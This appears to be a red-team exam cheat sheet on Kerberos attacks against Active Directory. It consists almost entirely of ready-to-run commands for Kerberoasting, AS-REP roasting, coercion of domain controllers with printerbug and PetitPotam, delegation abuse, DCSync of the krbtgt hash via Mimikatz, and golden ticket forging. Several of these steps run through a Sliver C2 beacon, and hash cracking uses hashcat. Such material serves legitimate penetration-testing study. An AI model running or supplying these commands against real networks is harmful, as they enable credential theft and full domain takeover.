# Phase 09: Kerberos-Based Attacks

> Ticket abuse is the most common CRTeamer DA path. Know these cold.

---

## 1. Kerberoasting

```bash
# Linux — all SPNs at once
GetUserSPNs.py domain.local/username:Password1 -dc-ip <dc_ip> -request -outputfile ~/exam/kerb.hash

# Crack
hashcat -m 13100 ~/exam/kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 ~/exam/kerb.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Windows — via Rubeus (execute-assembly)
sliver (beacon) > execute-assembly /tools/Rubeus.exe kerberoast /outfile:kerb.txt /nowrap /aes
```

**Look for**: service accounts with weak passwords (`Summer2024`, `Service123!`, company name + year)

---

## 2. AS-REP Roasting

```bash
# No creds needed — just usernames
GetNPUsers.py domain.local/ -dc-ip <dc_ip> -no-pass -usersfile users.txt -outputfile ~/exam/asrep.hash

# With creds (enumerate and roast in one):
GetNPUsers.py domain.local/username:Password1 -dc-ip <dc_ip> -request -outputfile ~/exam/asrep.hash

# Crack
hashcat -m 18200 ~/exam/asrep.hash rockyou.txt
```

---

## 3. Unconstrained Delegation + Coercion

```bash
# Find non-DC hosts with unconstrained delegation
Get-DomainComputer -Unconstrained | Where {$_.Name -notmatch "DC"}

# Get SYSTEM on that host → wait for DA to connect, OR coerce DC:
python3 printerbug.py 'domain.local/username:Password1@dc01.domain.local' <unconstrained_host_ip>
python3 PetitPotam.py <unconstrained_host_ip> dc01.domain.local

# Capture TGT on unconstrained host
sliver (beacon) > execute-assembly /tools/Rubeus.exe monitor /interval:5 /filteruser:DC01$
# Inject captured TGT → DCSync
sliver (beacon) > execute-assembly /tools/Rubeus.exe ptt /ticket:<base64>
sliver (beacon) > execute-assembly /tools/Mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
```

---

## 4. Constrained Delegation (S4U Abuse)

```bash
# If account has constrained delegation → impersonate DA to allowed service
getST.py -spn cifs/dc01.domain.local -impersonate administrator \
  'domain.local/svc_account:Password1' -dc-ip <dc_ip>
export KRB5CCNAME=administrator@cifs_dc01.domain.local.ccache
secretsdump.py -k -no-pass dc01.domain.local
```

---

## 5. RBCD (Resource-Based Constrained Delegation)

```bash
# If you have GenericWrite/GenericAll on a computer object:
# Step 1: create fake computer (or use existing machine account)
addcomputer.py -computer-name 'FAKE$' -computer-pass 'FakePass123!' domain.local/username:Password1 -dc-ip <dc_ip>

# Step 2: write RBCD attribute
rbcd.py -action write -delegate-from 'FAKE$' -delegate-to 'TARGET$' \
  domain.local/username:Password1 -dc-ip <dc_ip>

# Step 3: get service ticket as administrator
getST.py -spn cifs/target.domain.local -impersonate administrator \
  'domain.local/FAKE$:FakePass123!' -dc-ip <dc_ip>

export KRB5CCNAME=administrator@cifs_target.domain.local.ccache
psexec.py -k -no-pass target.domain.local
```

---

## 6. Golden / Silver Tickets (Post-DCSync)

```bash
# After getting krbtgt hash via DCSync:
# Golden Ticket
sliver (beacon) > execute-assembly /tools/Rubeus.exe golden /user:administrator \
  /rc4:<krbtgt_hash> /domain:domain.local /sid:S-1-5-21-... /ptt

# Linux equivalent
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc01.domain.local
```

---

## Next Step → **Phase 10: Domain Privilege Escalation** (`10-domain-privesc.md`)
